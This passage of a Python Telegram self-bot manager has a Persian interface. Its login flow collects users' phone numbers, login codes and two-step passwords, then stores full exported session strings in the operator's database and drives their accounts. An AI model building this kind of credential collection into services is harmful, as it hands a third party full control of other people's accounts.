         InlineKeyboardButton(f"انتی لوگین {s_anti}", callback_data=f"toggle_anti_{user_id}")],
        [InlineKeyboardButton(f"تایپ {s_type}", callback_data=f"toggle_type_{user_id}"),
         InlineKeyboardButton(f"دشمن همگانی {s_enemy}", callback_data=f"toggle_g_enemy_{user_id}")],
        [InlineKeyboardButton(f"بازی {s_game}", callback_data=f"toggle_game_{user_id}")],
        [InlineKeyboardButton(f"🇺🇸 EN {l_en}", callback_data=f"lang_en_{user_id}"),
         InlineKeyboardButton(f"🇷🇺 RU {l_ru}", callback_data=f"lang_ru_{user_id}"),
         InlineKeyboardButton(f"🇨🇳 CN {l_cn}", callback_data=f"lang_cn_{user_id}")],
        [InlineKeyboardButton("بستن پنل ✖", callback_data=f"close_panel_{user_id}")]
    ])

@manager_bot.on_inline_query()
async def inline_panel_handler(client, query):
    user_id = query.from_user.id
    if query.query == "panel":
        result = InlineQueryResultArticle(
            title="پنل مدیریت", 
            input_message_content=InputTextMessageContent(f"⚡️ **مدیریت پیشرفته سلف بات**\n👤 کاربر: {user_id}\n\nوضعیت اتصال: ✔ برقرار"),
            reply_markup=generate_panel_markup(user_id), 
            thumb_url="https://telegra.ph/file/1e3b567786f7800e80816.jpg"
        )
        await query.answer([result], cache_time=0)

@manager_bot.on_callback_query()
async def callback_panel_handler(client, callback):
    data = callback.data.split("_")
    action = "_".join(data[:-1])
    target_user_id = int(data[-1])
    
    if callback.from_user.id != target_user_id:
        await callback.answer("⛔️ دسترسی غیرمجاز!", show_alert=True)
        return

    settings_update = {}

    if action == "toggle_clock":
        new_state = not CLOCK_STATUS.get(target_user_id, True)
        CLOCK_STATUS[target_user_id] = new_state
        settings_update["clock"] = new_state
        
        if target_user_id in ACTIVE_BOTS:
            bot_client = ACTIVE_BOTS[target_user_id][0]
            if new_state:
                asyncio.create_task(perform_clock_update_now(bot_client, target_user_id))
            else:
                try:
                    me = await bot_client.get_me()
                    clean_name = re.sub(r'(?:\s*' + CLOCK_CHARS_REGEX_CLASS + r'+)+$', '', me.first_name).strip()
                    if clean_name != me.first_name:
                        await bot_client.update_profile(first_name=clean_name)
                except: pass
    
    elif action == "cycle_font":
        cur = USER_FONT_CHOICES.get(target_user_id, 'stylized')
        idx = (FONT_KEYS_ORDER.index(cur) + 1) % len(FONT_KEYS_ORDER)
        new_font = FONT_KEYS_ORDER[idx]
        USER_FONT_CHOICES[target_user_id] = new_font
        CLOCK_STATUS[target_user_id] = True
        settings_update["font"] = new_font
        settings_update["clock"] = True
        
        if target_user_id in ACTIVE_BOTS:
            asyncio.create_task(perform_clock_update_now(ACTIVE_BOTS[target_user_id][0], target_user_id))
    
    elif action == "toggle_bold":
        new_state = not BOLD_MODE_STATUS.get(target_user_id, False)
        BOLD_MODE_STATUS[target_user_id] = new_state
        settings_update["bold"] = new_state
    
    elif action == "toggle_sec":
        new_state = not SECRETARY_MODE_STATUS.get(target_user_id, False)
        SECRETARY_MODE_STATUS[target_user_id] = new_state
        settings_update["secretary"] = new_state
    
    elif action == "toggle_seen":
        new_state = not AUTO_SEEN_STATUS.get(target_user_id, False)
        AUTO_SEEN_STATUS[target_user_id] = new_state
        settings_update["auto_seen"] = new_state
    
    elif action == "toggle_pv":
        new_state = not PV_LOCK_STATUS.get(target_user_id, False)
        PV_LOCK_STATUS[target_user_id] = new_state
        settings_update["pv_lock"] = new_state
    
    elif action == "toggle_anti":
        new_state = not ANTI_LOGIN_STATUS.get(target_user_id, False)
        ANTI_LOGIN_STATUS[target_user_id] = new_state
        settings_update["anti_login"] = new_state
    
    elif action == "toggle_type":
        new_state = not TYPING_MODE_STATUS.get(target_user_id, False)
        TYPING_MODE_STATUS[target_user_id] = new_state
        if new_state:
            PLAYING_MODE_STATUS[target_user_id] = False
            settings_update["playing"] = False
        settings_update["typing"] = new_state
    
    elif action == "toggle_game":
        new_state = not PLAYING_MODE_STATUS.get(target_user_id, False)
        PLAYING_MODE_STATUS[target_user_id] = new_state
        if new_state:
            TYPING_MODE_STATUS[target_user_id] = False
            settings_update["typing"] = False
        settings_update["playing"] = new_state
    
    elif action == "toggle_g_enemy":
        new_state = not GLOBAL_ENEMY_STATUS.get(target_user_id, False)
        GLOBAL_ENEMY_STATUS[target_user_id] = new_state
        settings_update["global_enemy"] = new_state
    
    elif action.startswith("lang_"):
        lang_map = {"en": "en", "ru": "ru", "cn": "zh-CN"}
        btn_lang = action.split("_")[1]
        actual_lang = lang_map.get(btn_lang)
        
        current = AUTO_TRANSLATE_TARGET.get(target_user_id)
        new_lang = actual_lang if current != actual_lang else None
        
        AUTO_TRANSLATE_TARGET[target_user_id] = new_lang
        settings_update["translate"] = new_lang
    
    elif action == "close_panel":
        try:
            if callback.inline_message_id:
                await client.edit_inline_text(callback.inline_message_id, "✔ پنل بسته شد.")
            else:
                await callback.message.delete()
        except: pass
        return

    if settings_update:
        data_manager.update_user_data(target_user_id, {"settings": settings_update})

    try:
        await callback.edit_message_reply_markup(generate_panel_markup(target_user_id))
    except: pass

@manager_bot.on_message(filters.command("start"))
async def start_login(client, message):
    buttons = [[KeyboardButton("📱 شماره و شروع", request_contact=True)]]
    
    if message.from_user and message.from_user.id in GOD_ADMIN_IDS:
        buttons.append([KeyboardButton("📊 وضعیت ربات"), KeyboardButton("📢 پیام همگانی")])
        
    kb = ReplyKeyboardMarkup(buttons, resize_keyboard=True, one_time_keyboard=True)
    await message.reply_text("👋 خوش آمدید.", reply_markup=kb)

@manager_bot.on_message(filters.private, group=-1)
async def admin_broadcast_sender(client, message):
    if not message.from_user:
        return
    user_id = message.from_user.id
    if user_id in GOD_ADMIN_IDS and ADMIN_STATES.get(user_id) == "broadcast":
        if message.text and message.text in ["/start", "📊 وضعیت ربات", "📢 پیام همگانی"]:
            return
            
        if message.text and message.text.strip() == "لغو":
            del ADMIN_STATES[user_id]
            kb = ReplyKeyboardMarkup([[KeyboardButton("📊 وضعیت ربات"), KeyboardButton("📢 پیام همگانی")]], resize_keyboard=True)
            await message.reply_text("❌ عملیات ارسال همگانی لغو شد.", reply_markup=kb)
            message.stop_propagation()
        
        await message.reply_text("⏳ در حال ارسال پیام همگانی...")
        success = 0
        failed = 0
        users = data_manager.get_all_users()
        
        for u_id_str in users.keys():
            try:
                await message.copy(int(u_id_str))
                success += 1
                await asyncio.sleep(0.05)
            except Exception:
                failed += 1
                
        del ADMIN_STATES[user_id]
        kb = ReplyKeyboardMarkup([[KeyboardButton("📊 وضعیت ربات"), KeyboardButton("📢 پیام همگانی")]], resize_keyboard=True)
        await message.reply_text(f"✅ پیام همگانی با موفقیت ارسال شد.\n\nتعداد دریافت موفق: {success}\nتعداد ناموفق: {failed}", reply_markup=kb)
        message.stop_propagation()

@manager_bot.on_message(filters.regex("^📢 پیام همگانی$") & filters.private)
async def broadcast_request_handler(client, message):
    if not message.from_user or message.from_user.id not in GOD_ADMIN_IDS:
        return
    ADMIN_STATES[message.from_user.id] = "broadcast"
    await message.reply_text("لطفاً پیامی که می‌خواهید برای همه کاربران ربات ارسال شود را بفرستید:\n\n(برای لغو عملیات، کلمه `لغو` را ارسال کنید)", reply_markup=ReplyKeyboardRemove())

@manager_bot.on_message(filters.text & filters.private & filters.regex("^📊 وضعیت ربات$"))
async def admin_status_handler(client, message):
    if not message.from_user or message.from_user.id not in GOD_ADMIN_IDS:
        return
        
    active_count = len(ACTIVE_BOTS)
    total_users = len(data_manager.data.get("users", {}))
    total_sessions = len(data_manager.data.get("sessions", {}))
    
    text = (
        "**📊 آمار و وضعیت سرور**\n\n"
        f"🟢 ربات‌های فعال (آنلاین): `{active_count}`\n"
        f"👥 کل کاربران دیتابیس: `{total_users}`\n"
        f"📱 نشست‌های ذخیره شده: `{total_sessions}`\n"
    )
    
    await message.reply_text(text)

@manager_bot.on_message(filters.contact)
async def contact_handler(client, message):
    chat_id = message.chat.id
    phone = message.contact.phone_number
    
    await message.reply_text("⏳ در حال اتصال...", reply_markup=ReplyKeyboardRemove())
    
    user_client = Client(f"login_{chat_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code(phone)
        LOGIN_STATES[chat_id] = {'step': 'code', 'phone': phone, 'client': user_client, 'hash': sent_code.phone_code_hash}
        await message.reply_text("✅ کد را بفرستید (مثلاً `1 1 1 1 1 با فاصله`)")
    except Exception as e:
        await user_client.disconnect()
        await message.reply_text(f"❌ خطا: {e}")

@manager_bot.on_message(filters.text & filters.private)
async def text_handler(client, message):
    chat_id = message.chat.id
    state = LOGIN_STATES.get(chat_id)
    
    if not state:
        return
    
    user_c = state['client']
    
    if state['step'] == 'code':
        code = re.sub(r"\D+", "", message.text)
        try:
            await user_c.sign_in(state['phone'], state['hash'], code)
            await finalize(message, user_c, state['phone'])
        except SessionPasswordNeeded:
            state['step'] = 'password'
            await message.reply_text("🔐 رمز دو مرحله‌ای را وارد کنید:")
        except Exception as e:
            await message.reply_text(f"❌ خطا: {e}")
    
    elif state['step'] == 'password':
        try:
            await user_c.check_password(message.text)
            await finalize(message, user_c, state['phone'])
        except Exception as e:
            await message.reply_text(f"❌ خطا: {e}")

async def finalize(message, user_c, phone):
    s_str = await user_c.export_session_string()
    me = await user_c.get_me()
    await user_c.disconnect()
    
    data_manager.save_session(phone, s_str, me.id, me.first_name or "", me.username or "")
    
    asyncio.create_task(start_bot_instance(s_str, phone, me.id, 'stylized'))
    
    del LOGIN_STATES[message.chat.id]
    await message.reply_text("✅ فعال شد! دستور `پنل` را در اکانت خود بزنید.")

async def main():
    for phone, session_data in data_manager.get_all_sessions():
        session_string = session_data["string"]
        user_id = session_data["user_id"]
        asyncio.create_task(start_bot_instance(session_string, phone, user_id, 'stylized'))
    
    await manager_bot.start()
    logging.info("✅ Manager bot started")
    
    await idle()

if __name__ == "__main__":
    asyncio.get_event_loop().run_until_complete(main())